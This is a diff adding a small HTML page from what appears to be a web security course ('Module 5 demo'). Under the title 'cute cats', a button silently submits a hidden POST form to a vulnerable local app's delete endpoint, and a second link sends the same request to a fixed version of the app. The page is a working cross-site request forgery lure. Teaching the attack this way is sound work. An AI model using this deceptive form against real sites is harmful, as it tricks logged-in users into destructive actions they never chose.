@@ -1,0 +1,11 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><title>Totally harmless cat pictures</title></head>
+<body style="font:16px system-ui;max-width:640px;margin:40px auto;padding:0 16px">
+<h1>Cute cats 🐱</h1>
+<p>(Module 5 demo: this page, on another origin, silently submits a form to the vulnerable app. Your browser attaches the logged-in cookie.)</p>
+<form id="f" method="post" action="http://localhost:3003/delete">
+  <input type="hidden" name="id" value="4">
+</form>
+<p><button onclick="document.getElementById('f').submit()">Show me the cats</button>
+&nbsp;<a href="javascript:void(0)" onclick="document.getElementById('f').action='http://localhost:3003/delete?fixed=1';document.getElementById('f').submit()">same attack against the FIXED app</a></p>
+</body></html>
